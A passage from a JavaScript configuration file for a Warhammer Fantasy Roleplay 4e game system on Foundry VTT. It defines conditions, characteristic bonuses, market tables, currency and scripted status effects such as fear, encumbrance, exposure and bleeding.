    "bleeding": "WFRP4E.ConditionName.Bleeding",
    "blinded": "WFRP4E.ConditionName.Blinded",
    "broken": "WFRP4E.ConditionName.Broken",
    "deafened": "WFRP4E.ConditionName.Deafened",
    "entangled": "WFRP4E.ConditionName.Entangled",
    "fatigued": "WFRP4E.ConditionName.Fatigued",
    "poisoned": "WFRP4E.ConditionName.Poisoned",
    "prone": "WFRP4E.ConditionName.Prone",
    "stunned": "WFRP4E.ConditionName.Stunned",
    "surprised": "WFRP4E.ConditionName.Surprised",
    "unconscious": "WFRP4E.ConditionName.Unconscious",
    "grappling": "WFRP4E.ConditionName.Grappling",
    "engaged": "WFRP4E.ConditionName.Engaged",
    "defeated": "WFRP4E.ConditionName.Defeated"
};


WFRP4E.earningValues = {
    "b": "2d10",
    "s": "1d10",
    "g": "1",
};

WFRP4E.randomExp = {
    speciesRand: 20,
    careerRand: 50,
    careerReroll: 25,
    statsRand: 50,
    statsReorder: 25
};

WFRP4E.reachNum = {
    "personal": 1,
    "vshort": 2,
    "short": 3,
    "average": 4,
    "long": 5,
    "vLong": 6,
    "massive": 7,
};

WFRP4E.traitBonuses = {
    "big": {
        "s": 10,
        "t": 10,
        "ag": -5
    },
    "brute": {
        "m": -1,
        "t": 10,
        "s": 10,
        "ag": -10
    },
    "clever": {
        "int": 20,
        "i": 10
    },
    "cunning": {
        "int": 10,
        "fel": 10,
        "i": 10
    },
    "elite": {
        "ws": 20,
        "bs": 20,
        "wp": 20
    },
    "fast": {
        "ag": 10,
        "m": 1
    },
    "leader": {
        "fel": 10,
        "wp": 10
    },
    "tough": {
        "t": 10,
        "wp": 10
    },
    "swarm": {
        "ws": 10
    }
};

WFRP4E.talentBonuses = {
    "savvy": "int",
    "suave": "fel",
    "marksman": "bs",
    "very strong": "s",
    "sharp": "i",
    "lightning reflexes": "ag",
    "coolheaded": "wp",
    "very resilient": "t",
    "nimble fingered": "dex",
    "warrior born": "ws"
};

WFRP4E.corruptionTables = ["mutatephys", "mutatemental"];

WFRP4E.DAMAGE_TYPE = {
    NORMAL: 0,
    IGNORE_AP: 1,
    IGNORE_TB: 2,
    IGNORE_ALL: 3
};

WFRP4E.PSEUDO_ENTITIES = [
    "Table",
    "Condition",
    "Symptom",
    "Roll",
    "Pay",
    "Credit",
    "Corruption",
    "Fear",
    "Terror",
    "Exp"
];

WFRP4E.availabilityTable = {
    "MARKET.Village": {
        "WFRP4E.Availability.Common": {
            test: 100,
            stock: '2'
        },
        "WFRP4E.Availability.Scarce": {
            test: 30,
            stock: '1'
        },
        "WFRP4E.Availability.Rare": {
            test: 15,
            stock: '1'
        },
        "WFRP4E.Availability.Exotic": {
            test: 0,
            stock: '0'
        }
    },
    "MARKET.Town": {
        "WFRP4E.Availability.Common": {
            test: 100,
            stock: '2d10'
        },
        "WFRP4E.Availability.Scarce": {
            test: 60,
            stock: '1d10'
        },
        "WFRP4E.Availability.Rare": {
            test: 30,
            stock: '1d5'
        },
        "WFRP4E.Availability.Exotic": {
            test: 0,
            stock: '0'
        }
    },
    "MARKET.City": {
        "WFRP4E.Availability.Common": {
            test: 100,
            stock: '∞'
        },
        "WFRP4E.Availability.Scarce": {
            test: 90,
            stock: '∞'
        },
        "WFRP4E.Availability.Rare": {
            test: 45,
            stock: '∞'
        },
        "WFRP4E.Availability.Exotic": {
            test: 0,
            stock: '0'
        }
    }
};

WFRP4E.overCastTable = {
  range: [
    {cost: 1, value: 2},
    {cost: 4, value: 3},
    {cost: 16, value: 4}],
  target: [
    {cost: 1, value: 1},
    {cost: 4, value: 2},
    {cost: 16, value: 3}],
  AoE: [
    {cost: 3, value: 2},
    {cost: 18, value: 3}],
  duration: [
    {cost: 2, value: 2},
    {cost: 6, value: 3}],
  damage: [
    {cost: 1, value: 1},
    {cost: 1, value: 2},
    {cost: 1, value: 3},
    {cost: 2, value: 4},
    {cost: 3, value: 5},
    {cost: 5, value: 6},
    {cost: 8, value: 7}]
};

WFRP4E.species = {};
WFRP4E.subspecies = {};
WFRP4E.speciesCharacteristics = {};
WFRP4E.speciesSkills = {};
WFRP4E.speciesTalents = {};
WFRP4E.speciesRandomTalents = {};
WFRP4E.speciesTalentReplacement = {};
WFRP4E.speciesMovement = {};
WFRP4E.speciesFate = {};
WFRP4E.speciesRes = {};
WFRP4E.speciesExtra = {};
WFRP4E.speciesAge = {};
WFRP4E.speciesHeight = {};
WFRP4E.speciesCareerReplacements = {};
WFRP4E.classTrappings = {};
WFRP4E.weaponGroupDescriptions = {};
WFRP4E.reachDescription = {};
WFRP4E.qualityDescriptions = {};
WFRP4E.flawDescriptions = {};
WFRP4E.loreEffectDescriptions = {};
WFRP4E.loreEffects = {};
WFRP4E.conditionDescriptions = {};
WFRP4E.symptoms = {};
WFRP4E.symptomDescriptions = {};
WFRP4E.symptomTreatment = {};
WFRP4E.modTypes = {};
WFRP4E.symptomEffects = {};
WFRP4E.effectScripts = {};

WFRP4E.premiumModules = {
    "wfrp4e" : "WFRP4e System",
    "wfrp4e-core" : "Core Rulebook",
    "wfrp4e-starter-set" : "Starter Set",
    "wfrp4e-rnhd" : "Rough Nights & Hard Days",
    "wfrp4e-eis" : "Enemy In Shadows",
    "wfrp4e-ua1" : "Ubersreik Adventures I",
    "wfrp4e-dotr" : "Death on the Reik",
    "wfrp4e-middenheim" : "Middenheim: City of the White Wolf",
    "wfrp4e-archives1" : "Archives of the Empire: Vol I.",
    "wfrp4e-pbtt" : "Power Behind the Throne",
    "wfrp4e-altdorf" : "Altdorf: Crown of the Empire",
    "wfrp4e-ua2" : "Ubersreik Adventures II",
    "wfrp4e-owb1" : "Old World Bundle I",
    "wfrp4e-horned-rat" : "The Horned Rat",
    "wfrp4e-empire-ruins" : "Empire in Ruins",
    "wfrp4e-archives2" : "Archives of the Empire: Vol II.",
    "wfrp4e-up-in-arms" : "Up In Arms",
    "wfrp4e-wom" : "Winds of Magic",
    "wfrp4e-zoo" : "Imperial Zoo",
    "wfrp4e-salzenmund" : "Salzenmund: City of Salt and Silver",
    "wfrp4e-owb2" : "Old World Bundle II",
    "wfrp4e-soc" : "Sea of Claws",
};

WFRP4E.trade = { 
    gazetteer : [],
    settlementRating : {
        "hamlet": { popmax: 200,
          size_rating: 1 },
      
        "village": {
          popmax: 1500,
          size_rating: 2
        },
      
        "town": { popmax: 10000,
          size_rating: 3 },
      
        "city": { popmax: 100000000,
          size_rating: 4 }
      },
      wealthAvailability : [
        { wealth: 0,
          offered: -1.0 },
        
          { wealth: 1,
          offered: -0.5 },
        
        { wealth: 2,
          offered: -0.2 },
        
        { wealth: 3,
          offered: 0 },
        
        { wealth: 4,
          offered: 0.05 },
        
        { wealth: 5,
          offered: 0.1 }
        ],
        cargoTypes : {},
        seasons : {},
        cargoTable : {},
        wineBrandyPrice : [],
        qualities : {}
};

// This defines the standard money used. 
// "moneyNames" is what currency name to look for when creating a character 
// The money keys are used for parsing input (like commands)
// Override these values if you wish to have a campaign in a different setting
WFRP4E.moneyNames = {
    "gc" : "NAME.GC",
    "ss" : "NAME.SS",
    "bp" : "NAME.BP"
};

WFRP4E.moneyValues = {
    "gc" : 240,
    "ss" : 20,
    "bp" : 1
};

WFRP4E.hitLocationTables = {
    "hitloc": "WFRP4E.hitLocationTables.hitloc",
    "snake": "WFRP4E.hitLocationTables.snake",
    "spider": "WFRP4E.hitLocationTables.spider"
};

WFRP4E.extendedTestCompletion = {
    none: "ExtendedTest.None",
    reset: "ExtendedTest.Reset",
    remove: "ExtendedTest.Remove"
};

// For modules to add to these, they need to be merged
WFRP4E.systemItems = {};
WFRP4E.systemEffects = {};
WFRP4E.vehicleSystemEffects = {};
WFRP4E.groupAdvantageActions = [];

WFRP4E.PrepareSystemItems = function() {

    this.systemItems = foundry.utils.mergeObject(this.systemItems, {
        reload : {
            type: "extendedTest",
            name: "",
            system: {
                SL: {
                },
                test: {
                    value: ""
                },
                completion: {
                    value: "remove"
                }
            },
            flags: {
                wfrp4e: {
                    reloading: ""
                }
            }
        },
        improv : {
            name: game.i18n.localize("NAME.Improvised"),
            type: "weapon",
            effects : [],
            system: {
                damage: { value: "SB + 1" },
                reach: { value: "personal" },
                weaponGroup: { value: "basic" },
                twohanded: { value: false },
                qualities: { value: [] },
                flaws: { value: [{name : "undamaging"}] },
                special: { value: "" },
                range: { value: "" },
                ammunitionGroup: { value: "" },
                offhand: { value: false },
            }
        },
        stomp : {
            name: game.i18n.localize("NAME.Stomp"),
            type: "trait",
            effects : [],
            system: {
                specification: { value: 0 },
                rollable: { value: true, rollCharacteristic: "ws", bonusCharacteristic: "s", defaultDifficulty: "challenging", damage : true, SL: true, skill : game.i18n.localize("NAME.MeleeBrawling") },
            }
        },
        unarmed : {
            name: game.i18n.localize("NAME.Unarmed"),
            type: "weapon",
            effects : [],
            system: {
                damage: { value: "SB + 0" },
                reach: { value: "personal" },
                weaponGroup: { value: "brawling" },
                twohanded: { value: false },
                qualities: { value: [] },
                flaws: { value: [{name : "undamaging"}] },
                special: { value: "" },
                range: { value: "" },
                ammunitionGroup: { value: "" },
                offhand: { value: false },
            }
        },

        fear : {
            name : game.i18n.localize("NAME.FearExtendedTest"),
            type : "extendedTest",
            system : {
                completion:{value: 'remove'},
                description:{type: 'String', label: 'Description', value: ''},
                failingDecreases:{value: true},
                gmdescription:{type: 'String', label: 'Description', value: ''},
                hide: { test: false, progress: false },
                negativePossible: { value: false },
                SL: { current: 0, target: 1 },
                test: { value: game.i18n.localize("NAME.Cool") }
            },
            flags : {
                wfrp4e : {
                    fear : true
                }
            },
            effects:
                [{
                    name: game.i18n.localize("NAME.Fear"),
                    icon: "systems/wfrp4e/icons/conditions/fear.png",
                    statuses : ["fear"],
                    flags: {
                        wfrp4e : {
                            applicationData : {},
                            scriptData : [
                                {
                                    label : "@effect.flags.wfrp4e.dialogTitle",
                                    trigger : "dialog",
                                    script : `args.fields.slBonus -= 1`,
                                    options : {
                                        dialog : {
                                            hideScript : "",
                                            activateScript : `return args.data.targets[0]?.name == this.item.flags.wfrp4e?.fearName`
                                        }
                                    }
                                },
                                {
                                    label : "@effect.name",
                                    trigger : "immediate",
                                    script : `
                                    let name = this.item?.flags?.wfrp4e?.fearName
                                    this.effect.updateSource({"flags.wfrp4e.dialogTitle" : (name ? game.i18n.format("EFFECT.AffectTheSourceOfFearName", {name}) : game.i18n.format("EFFECT.AffectTheSourceOfFear"))})
                                    if (name)
                                    {
                                        this.item.updateSource({name : this.item.name + " (" + name + ")" })
                                    }
                                    `
                                }
                            ]
                        }
                    }
                }]

        },

        terror: {
            name: game.i18n.localize("NAME.Terror"),
            icon: "systems/wfrp4e/icons/conditions/terror.png",
            transfer: true,
            flags: {
                wfrp4e : {
                    applicationData : {},
                    scriptData : [
                        {
                            label : "@effect.name",
                            trigger : "immediate",
                            script : `
                            let terror = this.effect.flags.wfrp4e.terrorValue;
                            let skillName = game.i18n.localize("NAME.Cool");
                            let test = await args.actor.setupSkill(skillName, {terror: true, appendTitle : " - Terror", skipTargets: true});
                            await test.roll();
                            await this.actor.applyFear(terror, name)
                            if (test.failed)
                            {
                                if (test.result.SL < 0)
                                    terror += Math.abs(test.result.SL)

                                await this.actor.addCondition("broken", terror)
                            }
                            `
                        }
                    ]
                },
            }
        }
    });


    this.systemEffects = foundry.utils.mergeObject(this.systemEffects, {
        "fear":  {
            name: game.i18n.localize("NAME.Fear"),
            icon: "systems/wfrp4e/icons/conditions/fear.png",
            statuses : ["fear"],
            flags: {
                wfrp4e : {
                    applicationData : {},
                    scriptData : [
                        {
                            label : "@effect.flags.wfrp4e.dialogTitle",
                            trigger : "dialog",
                            script : `args.fields.slBonus -= 1`,
                            options : {
                                dialog : {
                                    hideScript : "",
                                    activateScript : `return args.data.targets[0]?.name == this.item.flags.wfrp4e?.fearName`
                                }
                            }
                        },
                        {
                            label : "@effect.name",
                            trigger : "immediate",
                            script : `
                            let name = this.item?.flags?.wfrp4e?.fearName
                            this.effect.updateSource({"flags.wfrp4e.dialogTitle" : (name ? game.i18n.format("EFFECT.AffectTheSourceOfFearName", {name}) : game.i18n.format("EFFECT.AffectTheSourceOfFear"))})
                            if (name)
                            {
                                this.item.updateSource({name : this.item.name + " (" + name + ")" })
                            }
                            `
                        }
                    ]
                }
            }
        },
        "enc1" : {
            name: game.i18n.localize("EFFECT.Encumbrance") + " 1",
            icon: "systems/wfrp4e/icons/effects/enc1.png",
            statuses : ["enc1"],
            flags : {
                wfrp4e : {
                    applicationData : {},
                    scriptData : [
                        {
                            label : "@effect.name",
                            trigger : "prePrepareData",
                            script : `
                            args.actor.characteristics.ag.modifier -= 10;

                            if (args.actor.details.move.value > 3)
                            {
                                args.actor.details.move.value -= 1;
                                if (args.actor.details.move.value < 3)
                                    args.actor.details.move.value = 3
                            }
                            `
                        }
                    ]
                }
            }
        },
        "enc2" : {
            name: game.i18n.localize("EFFECT.Encumbrance") + " 2",
            icon: "systems/wfrp4e/icons/effects/enc2.png",
            statuses : ["enc2"],
            flags : {
                wfrp4e : {
                    applicationData : {},
                    scriptData : [
                        {
                            label : "@effect.name",
                            trigger : "prePrepareData",
                            script : `
                            args.actor.characteristics.ag.modifier -= 20;
                            if (args.actor.details.move.value > 2)
                            {
                                args.actor.details.move.value -= 2;
                                if (args.actor.details.move.value < 2)
                                    args.actor.details.move.value = 2
                            }
                            `
                        }
                    ]
                }
            }
        },
        "enc3" : {
            name: game.i18n.localize("EFFECT.Encumbrance") + " 3",
            icon: "systems/wfrp4e/icons/effects/enc3.png",
            statuses : ["enc3"],
            flags : {
                wfrp4e : {
                    applicationData : {},
                    scriptData : [
                        {
                            label : "@effect.name",
                            trigger : "prePrepareData",
                            script : "args.actor.details.move.value = 0;"
                        }
                    ]
                }
            }
        },
        "cold1" : {
            name: game.i18n.localize("EFFECT.ColdExposure") + " 1",
            icon: "",
            statuses : ["cold1"],
            changes : [
                {key : "system.characteristics.bs.modifier", mode: 2, value: -10},
                {key : "system.characteristics.ag.modifier", mode: 2, value: -10},
                {key : "system.characteristics.dex.modifier", mode: 2, value: -10},
            ]
        },
        "cold2" : {
            name: game.i18n.localize("EFFECT.ColdExposure") + " 2",
            icon: "",
            statuses : ["cold2"],
            changes : [
                {key : "system.characteristics.bs.modifier", mode: 2, value: -10},
                {key : "system.characteristics.ag.modifier", mode: 2, value: -10},
                {key : "system.characteristics.ws.modifier", mode: 2, value: -10},
                {key : "system.characteristics.s.modifier", mode: 2, value: -10},
                {key : "system.characteristics.t.modifier", mode: 2, value: -10},
                {key : "system.characteristics.i.modifier", mode: 2, value: -10},
                {key : "system.characteristics.dex.modifier", mode: 2, value: -10},
                {key : "system.characteristics.int.modifier", mode: 2, value: -10},
                {key : "system.characteristics.wp.modifier", mode: 2, value: -10},
                {key : "system.characteristics.fel.modifier", mode: 2, value: -10},
                {key : "system.characteristics.t.calculationBonusModifier", mode: 2, value: 1},
                {key : "system.characteristics.s.calculationBonusModifier", mode: 2, value: 1},
                {key : "system.characteristics.wp.calculationBonusModifier", mode: 2, value: 1},
            ]
        },
        "cold3" : {
            name: game.i18n.localize("EFFECT.ColdExposure") + " 3",
            icon: "",
            statuses : ["cold3"],
            flags : {
                wfrp4e : {
                    applicationData : {},
                    scriptData : [
                        {
                            label : "@effect.name",
                            trigger : "manual",
                            script : `
                            let tb = this.actor.characteristics.t.bonus
                            let damage = (await new Roll("1d10").roll()).total
                            damage -= tb
                            if (damage <= 0) damage = 1
                            if (this.actor.status.wounds.value <= damage) {
                                await this.actor.addCondition("unconscious")
                            }
                            this.actor.modifyWounds(-damage)
                            ui.notifications.notify(game.i18n.format("TookDamage", { damage: damage }))
                            `
                        }
                    ]
                }
            }
        },
        "heat1" : {
            name: game.i18n.localize("EFFECT.HeatExposure") + " 1",
            icon: "",
            statuses : ["heat1"],
            changes : [
                {key : "system.characteristics.int.modifier", mode: 2, value: -10},
                {key : "system.characteristics.wp.modifier", mode: 2, value: -10},
                {key : "system.characteristics.wp.calculationBonusModifier", mode: 2, value: 1},
            ]
        },
        "heat2" : {
            name: game.i18n.localize("EFFECT.HeatExposure") + " 2",
            icon: "",
            statuses : ["heat2"],
            changes : [
                {key : "system.characteristics.bs.modifier", mode: 2, value: -10},
                {key : "system.characteristics.ag.modifier", mode: 2, value: -10},
                {key : "system.characteristics.ws.modifier", mode: 2, value: -10},
                {key : "system.characteristics.s.modifier", mode: 2, value: -10},
                {key : "system.characteristics.t.modifier", mode: 2, value: -10},
                {key : "system.characteristics.i.modifier", mode: 2, value: -10},
                {key : "system.characteristics.dex.modifier", mode: 2, value: -10},
                {key : "system.characteristics.int.modifier", mode: 2, value: -10},
                {key : "system.characteristics.wp.modifier", mode: 2, value: -10},
                {key : "system.characteristics.fel.modifier", mode: 2, value: -10},
                {key : "system.characteristics.t.calculationBonusModifier", mode: 2, value: 1},
                {key : "system.characteristics.s.calculationBonusModifier", mode: 2, value: 1},
                {key : "system.characteristics.wp.calculationBonusModifier", mode: 2, value: 1},
            ]
        },
        "heat3" : {
            name: game.i18n.localize("EFFECT.HeatExposure") + " 3",
            icon: "",
            statuses : ["heat3"],
            flags : {
                wfrp4e : {
                    applicationData : {},
                    scriptData : [
                        {
                            label : "@effect.name",
                            trigger : "manual",
                            script : `
                            let tb = this.actor.characteristics.t.bonus
                            let damage = (await new Roll("1d10").roll()).total
                            damage -= tb
                            if (damage <= 0) {
                                damage = 1
                            }
                            this.actor.modifyWounds(-damage)
                            ui.notifications.notify(game.i18n.format("TookDamage", { damage: damage }))
                            `
                        }
                    ]
                }
            }
        },
        "thirst1" : {
            name: game.i18n.localize("EFFECT.Thirst") + " 1",
            icon: "",
            statuses : ["thirst1"],
            changes : [
                {key : "system.characteristics.int.modifier", mode: 2, value: -10},
                {key : "system.characteristics.wp.modifier", mode: 2, value: -10},
                {key : "system.characteristics.fel.modifier", mode: 2, value: -10},
                {key : "system.characteristics.wp.calculationBonusModifier", mode: 2, value: 1},
            ]
        },
        "thirst2" : {
            name: game.i18n.localize("EFFECT.Thirst") + " 2+",
            icon: "",
            statuses : ["thirst2"],
            changes : [
                {key : "system.characteristics.bs.modifier", mode: 2, value: -10},
                {key : "system.characteristics.ag.modifier", mode: 2, value: -10},
                {key : "system.characteristics.ws.modifier", mode: 2, value: -10},
                {key : "system.characteristics.s.modifier", mode: 2, value: -10},
                {key : "system.characteristics.t.modifier", mode: 2, value: -10},
                {key : "system.characteristics.i.modifier", mode: 2, value: -10},
                {key : "system.characteristics.int.modifier", mode: 2, value: -10},
                {key : "system.characteristics.dex.modifier", mode: 2, value: -10},
                {key : "system.characteristics.wp.modifier", mode: 2, value: -10},
                {key : "system.characteristics.fel.modifier", mode: 2, value: -10},
                {key : "system.characteristics.t.calculationBonusModifier", mode: 2, value: 1},
                {key : "system.characteristics.s.calculationBonusModifier", mode: 2, value: 1},
                {key : "system.characteristics.wp.calculationBonusModifier", mode: 2, value: 1},
            ],
            flags : {
                wfrp4e : {
                    applicationData : {},
                    scriptData : [
                        {
                            label : "@effect.name",
                            trigger : "manual",
                            script : `
                            let tb = this.actor.characteristics.t.bonus
                            let damage = (await new Roll("1d10").roll()).total
                            damage -= tb
                            if (damage <= 0) {
                                damage = 1
                            }
                            this.actor.modifyWounds(-damage)
                            ui.notifications.notify(game.i18n.format("TookDamage", { damage: damage }))
                            `
                        }
                    ]
                }
            }
        },
        "starvation1" : {
            name: game.i18n.localize("EFFECT.Starvation") + " 1",
            icon: "",
            statuses : ["starvation1"],
            changes : [
                {key : "system.characteristics.s.modifier", mode: 2, value: -10},
                {key : "system.characteristics.t.modifier", mode: 2, value: -10},
                {key : "system.characteristics.t.calculationBonusModifier", mode: 2, value: 1},
                {key : "system.characteristics.s.calculationBonusModifier", mode: 2, value: 1},
            ]
        },
        "starvation2" : {
            name: game.i18n.localize("EFFECT.Starvation") + " 2",
            icon: "",
            statuses : ["starvation2"],
            changes : [
                {key : "system.characteristics.bs.modifier", mode: 2, value: -10},
                {key : "system.characteristics.ag.modifier", mode: 2, value: -10},
                {key : "system.characteristics.ws.modifier", mode: 2, value: -10},
                {key : "system.characteristics.s.modifier", mode: 2, value: -10},
                {key : "system.characteristics.t.modifier", mode: 2, value: -10},
                {key : "system.characteristics.i.modifier", mode: 2, value: -10},
                {key : "system.characteristics.int.modifier", mode: 2, value: -10},
                {key : "system.characteristics.dex.modifier", mode: 2, value: -10},
                {key : "system.characteristics.wp.modifier", mode: 2, value: -10},
                {key : "system.characteristics.fel.modifier", mode: 2, value: -10},
                {key : "system.characteristics.t.calculationBonusModifier", mode: 2, value: 1},
                {key : "system.characteristics.s.calculationBonusModifier", mode: 2, value: 1},
                {key : "system.characteristics.wp.calculationBonusModifier", mode: 2, value: 1},
            ],
            flags : {
                wfrp4e : {
                    applicationData : {},
                    scriptData : [
                        {
                            label : "@effect.name",
                            trigger : "manual",
                            script : `
                            let tb = this.actor.characteristics.t.bonus
                            let damage = (await new Roll("1d10").roll()).total
                            damage -= tb
                            if (damage <= 0) {
                                damage = 1
                            }
                            this.actor.modifyWounds(-damage)
                            ui.notifications.notify(game.i18n.format("TookDamage", { damage: damage }))
                            `
                        }
                    ]
                }
            }
        },
        "blackpowder":  {
            name: game.i18n.localize("EFFECT.BlackpowderShock"),
            icon: "",
            statuses : ["blackpowder"],
            flags: {
                wfrp4e : {
                    blackpowder: true,
                    applicationData : {},
                    scriptData : [
                        {
                            label : "@effect.name",
                            trigger : "immediate",
                            script : `
                                test = await this.actor.setupSkill("Cool", {appendTitle : " - " + this.effect.name, skipTargets: true, fields : {difficulty : "average"}});
                                await test.roll();
                                if (test.failed)
                                {
                                    this.actor.addCondition("broken");
                                }
                                return false;
                            `
                        }
                    ]
                }
            }
        },
        "infighting" : {
            name: game.i18n.localize("EFFECT.Infighting"),
            icon: "modules/wfrp4e-core/icons/talents/in-fighter.png",
            statuses : ["infighting"],
            flags : {
                wfrp4e : {
                    applicationData : {},
                    scriptData : [
                        {
                            label : "@effect.name",
                            trigger : "prePrepareItem",
                            script : `
                            if (args.item.type == "weapon" && args.item.isEquipped)
                            {
                                let weaponLength = args.item.reachNum
                                if (weaponLength > 3)
                                {
                                    let improv = foundry.utils.duplicate(game.wfrp4e.config.systemItems.improv)
                                    improv.system.twohanded.value = args.item.twohanded.value
                                    improv.system.offhand.value = args.item.offhand.value
                                    improv.name = args.item.name + " (" + game.i18n.localize("EFFECT.Infighting") + ")"
                                    foundry.utils.mergeObject(args.item.system, improv.system, {overwrite : true})
                                    args.item.system.qualities = improv.system.qualities
                                    args.item.system.flaws = improv.system.flaws
                                    args.item.name = improv.name
                                    args.item.system.infighting = true;
                                }
                            }
                            `
                        }
                    ]
                }
            }
        },
        "defensive" : {
            name: game.i18n.localize("EFFECT.OnDefensive"),
            icon: "",
            statuses : ["defensive"],
            flags : {
                wfrp4e : {
                    applicationData : {},
                    scriptData : [
                        {
                            label : "@effect.name",
                            trigger : "dialog",
                            script : `args.prefillModifiers.modifier += 20`,
                            options : {
                                dialog : {
                                    hideScript : "return !this.actor.isOpposing",
                                    activateScript : `
                                        let skillName = this.effect.name.substring(this.effect.name.indexOf("[") + 1, this.effect.name.indexOf("]"))
                                        return args.skill?.name == skillName
                                    `
                                }
                            }
                        },
                        {
                            label : "@effect.name",
                            trigger : "immediate",
                            script : `
                                let choice = await ItemDialog.create(this.actor.itemTypes.skill.sort((a, b) => a.name > b.name ? 1 : -1), 1, "Choose which skill to use with On the Defensive");    
                                this.effect.updateSource({name : this.effect.name + " [" +  choice[0]?.name + "]"})
                                `
                        }
                    ]
                }
            }
        },
        "dualwielder" : {
            name: game.i18n.localize("EFFECT.DualWielder"),
            icon: "modules/wfrp4e-core/icons/talents/dual-wielder.png",
            statuses : ["dualwielder"],
            flags : {
                wfrp4e : {
                    applicationData : {},
                    scriptData : [
                        {
                            label : "@effect.name",
                            trigger : "dialog",
                            script : `args.prefillModifiers.modifier -= 10`,
                            options : {
                                dialog : {
                                    hideScript : "return !this.actor.isOpposing",
                                    activateScript : `return this.actor.isOpposing`
                                }
                            }
                        }
                    ]
                }
            }
        },
        "consumealcohol1" : {
            name: game.i18n.localize("EFFECT.ConsumeAlcohol") + " 1",
            icon: "",
            statuses : ["consumealcohol1"],
            changes : [
                {key : "system.characteristics.bs.modifier", mode: 2, value: -10},
                {key : "system.characteristics.ag.modifier", mode: 2, value: -10},
                {key : "system.characteristics.ws.modifier", mode: 2, value: -10},
                {key : "system.characteristics.int.modifier", mode: 2, value: -10},
                {key : "system.characteristics.dex.modifier", mode: 2, value: -10},
            ]
        },
        "consumealcohol2" : {
            name: game.i18n.localize("EFFECT.ConsumeAlcohol") + " 2",
            icon: "",
            statuses : ["consumealcohol2"],
            changes : [
                {key : "system.characteristics.bs.modifier", mode: 2, value: -20},
                {key : "system.characteristics.ag.modifier", mode: 2, value: -20},
                {key : "system.characteristics.ws.modifier", mode: 2, value: -20},
                {key : "system.characteristics.int.modifier", mode: 2, value: -20},
                {key : "system.characteristics.dex.modifier", mode: 2, value: -20},
            ]
        },
        "consumealcohol3" : {
            name: game.i18n.localize("EFFECT.ConsumeAlcohol") + " 3",
            icon: "",
            statuses : ["consumealcohol3"],
            changes : [
                {key : "system.characteristics.bs.modifier", mode: 2, value: -30},
                {key : "system.characteristics.ag.modifier", mode: 2, value: -30},
                {key : "system.characteristics.ws.modifier", mode: 2, value: -30},
                {key : "system.characteristics.int.modifier", mode: 2, value: -30},
                {key : "system.characteristics.dex.modifier", mode: 2, value: -30},
            ]
        },
        "stinkingdrunk1" : {
            name: game.i18n.localize("EFFECT.MarienburghersCourage"),
            icon: "",
            statuses : ["stinkingdrunk1"],
            wfrp4e : {
                applicationData : {},
                scriptData : [
                    {
                        label : "@effect.name",
                        trigger : "dialog",
                        script : `args.prefillModifiers.modifier += 20`,
                        options : {
                            dialog : {
                                hideScript : "return args.skill?.name != game.i18n.localize('NAME.Cool')",
                                activateScript : `return args.skill?.name == game.i18n.localize('NAME.Cool')`
                            }
                        }
                    }
                ]
            }
        }
    });

    this.statusEffects = [
        {
            icon: "systems/wfrp4e/icons/conditions/bleeding.png",
            id: "bleeding",
            statuses: ["bleeding"],
            name: "WFRP4E.ConditionName.Bleeding",
            flags: {
                wfrp4e: {
                    value: 1,
                    applicationData : {
                        conditionTrigger : "endRound"
                    },
                    scriptData: [
                        {
                            trigger: "manual",
                            label : "@effect.name",
                            script : `let actor = this.actor;
                            let effect = this.effect;
                            let bleedingAmt;
                            let bleedingRoll;
                            let msg = ""

                            let damage = effect.conditionValue;
                            let scriptArgs = {msg, damage};
                            await Promise.all(actor.runScripts("preApplyCondition", {effect, data : scriptArgs}))
                            msg = scriptArgs.msg;
                            damage = scriptArgs.damage;
                            msg += await actor.applyBasicDamage(damage, {damageType : game.wfrp4e.config.DAMAGE_TYPE.IGNORE_ALL, minimumOne : false, suppressMsg : true})

                            if (actor.status.wounds.value == 0 && !actor.hasCondition("unconscious"))
                            {
                                await actor.addCondition("unconscious")
                                msg += "<br>" + game.i18n.format("BleedUnc", {name: actor.prototypeToken.name })
                            }

                            if (actor.hasCondition("unconscious"))
                            {
                                bleedingAmt = effect.conditionValue;
                                bleedingRoll = (await new Roll("1d100").roll()).total;
                                if (bleedingRoll <= bleedingAmt * 10)
                                {
                                    msg += "<br>" + game.i18n.format("BleedFail", {name: actor.prototypeToken.name}) + " (" + game.i18n.localize("Rolled") + " " + bleedingRoll + ")";
                                    await actor.addCondition("dead")
                                }
                                else if (bleedingRoll % 11 == 0)
                                {
                                    msg += "<br>" + game.i18n.format("BleedCrit", { name: actor.prototypeToken.name } ) + " (" + game.i18n.localize("Rolled") + bleedingRoll + ")"
                                    await actor.removeCondition("bleeding")
                                }
                                else
                                {
                                    msg += "<br>" + game.i18n.localize("BleedRoll") + ": " + bleedingRoll;
                                }
                            }

                            await Promise.all(actor.runScripts("applyCondition", {effect, data : {bleedingRoll}}))
                            if (args.suppressMessage)
                            {
                                let messageData = game.wfrp4e.utility.chatDataSetup(msg);
                                messageData.speaker = {alias: this.effect.name}
                                messageData.flavor = this.effect.name;
                                return messageData
                            }
                            else
                            {
                                return this.script.scriptMessage(msg)
                            }
                            `
                        }
                    ]
                }
            }
        },
        {
            icon: "systems/wfrp4e/icons/conditions/poisoned.png",
            id: "poisoned",
            statuses: ["poisoned"],
            name: "WFRP4E.ConditionName.Poisoned",
            flags: {
                wfrp4e: {
                    value: 1,
                    applicationData : {
                        conditionTrigger : "endRound"
                    },
                    scriptData: [
                        {
                            trigger: "manual",
                            label : "@effect.name",
                            script : `let actor = this.actor;
                            let effect = this.effect;
                            let msg = ""

                            let damage = effect.conditionValue;
                            let scriptArgs = {msg, damage};
                            await Promise.all(actor.runScripts("preApplyCondition", {effect, data : scriptArgs}))
                            msg = scriptArgs.msg;
                            damage = scriptArgs.damage;
                            msg += await actor.applyBasicDamage(damage, {damageType : game.wfrp4e.config.DAMAGE_TYPE.IGNORE_ALL, suppressMsg : true})

                            await Promise.all(actor.runScripts("applyCondition", {effect}))
                            if (args.suppressMessage)
                            {
                                let messageData = game.wfrp4e.utility.chatDataSetup(msg);
                                messageData.speaker = {alias: this.effect.name}
                                return messageData
                            }
                            else
                            {
                                return this.script.scriptMessage(msg)
                            }
                            `
                        },
                        {
                            trigger: "dialog",
                            label : "@effect.name",
                            script : `args.fields.modifier -= 10 * this.effect.conditionValue`,
                            options : {
                                dialog : {
                                    activateScript : "return true"
                                }
                            }
                        }
                    ]
                }
            }

        },
        {
            icon: "systems/wfrp4e/icons/conditions/ablaze.png",
            id: "ablaze",
            statuses: ["ablaze"],
            name: "WFRP4E.ConditionName.Ablaze",
            flags: {
                wfrp4e: {
                    value: 1,
                    applicationData : {
                        conditionTrigger : "endRound"
                    },
